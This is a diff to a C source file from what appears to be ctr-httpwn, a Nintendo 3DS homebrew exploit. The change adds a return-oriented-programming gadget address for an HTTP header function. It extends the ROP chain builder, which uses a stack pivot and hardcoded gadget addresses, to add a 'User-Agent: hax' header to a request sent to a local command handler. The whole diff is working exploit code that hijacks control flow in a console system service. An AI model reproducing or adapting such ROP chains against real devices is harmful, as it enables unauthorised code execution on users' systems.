@@ -56,6 +56,7 @@ u32 ROP_ADDR0R0R3_POPR2R3R4R5R6PC = 0x00104eb1;//"adds r0, r0, r3" "pop {r2, r3,
 
 u32 ROP_httpc_CreateContext = 0x001212d9;//inr0=_this inr1=url* inr2=u8 reqmethod inr3=flag. When flag is non-zero, use SetProxyDefault.
 u32 ROP_httpc_CloseContext = 0x00123d55;//inr0=_this
+u32 ROP_httpc_AddRequestHeader = 0x00120751;//inr0=_this inr1=namestr* inr2=valuestr*
 
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
@@ -275,31 +276,39 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	u32 *ropchain0, ropvaddr0;
 
 	u32 httpctx = ropheap+0x0;
-	u32 urladdr;
+	u32 datastorageaddr;
 
 	u32 params[11];
-	u32 urlbuf[(0x28+0x40)>>2];//The +0x40 is needed to avoid corruption on stack.
+	u32 datastorage[(0x28+0xc+0x4+0x40)>>2];//The +0x40 is needed to avoid corruption on stack.
 
 	//Embed the URL in the ropchain data.
-	memset(urlbuf, 0, sizeof(urlbuf));
-	strncpy((char*)urlbuf, "http://localhost/ctr-httpwn/cmdhandler", sizeof(urlbuf)-1);
+	memset(datastorage, 0, sizeof(datastorage));
+	strncpy((char*)datastorage, "http://localhost/ctr-httpwn/cmdhandler", sizeof(datastorage)-1);
+	strncpy((char*)&datastorage[0x28>>2], "User-Agent", 0xb);
+	strncpy((char*)&datastorage[0x34>>2], "hax", 0x3);
 
 	ropchain0 = ropchain;
 	ropvaddr0 = *ropvaddr;
 	ropgen_stackpivot(&ropchain, ropvaddr, 0);
-	urladdr = *ropvaddr;
-	ropgen_addwords(&ropchain, ropvaddr, urlbuf, sizeof(urlbuf)>>2);
+	datastorageaddr = *ropvaddr;
+	ropgen_addwords(&ropchain, ropvaddr, datastorage, sizeof(datastorage)>>2);
 
 	ropgen_stackpivot(&ropchain0, &ropvaddr0, *ropvaddr);
 
 	memset(params, 0, sizeof(params));
 
 	params[0] = httpctx;//r0 = _this
-	params[1] = urladdr;//r1 = url
+	params[1] = datastorageaddr;//r1 = url
 	params[2] = 1;//r2 = reqmethod (GET)
 	params[3] = 1;//r3 = defaultproxy flag
 
 	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CreateContext, params);
+
+	memset(params, 0, sizeof(params));
+	params[0] = httpctx;//r0 = _this
+	params[1] = datastorageaddr+0x28;//r1 = namestr*
+	params[2] = datastorageaddr+0x34;//r2 = valuestr*
+	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_AddRequestHeader, params);
 
 	memset(params, 0, sizeof(params));
 	params[0] = httpctx;//r0 = _this
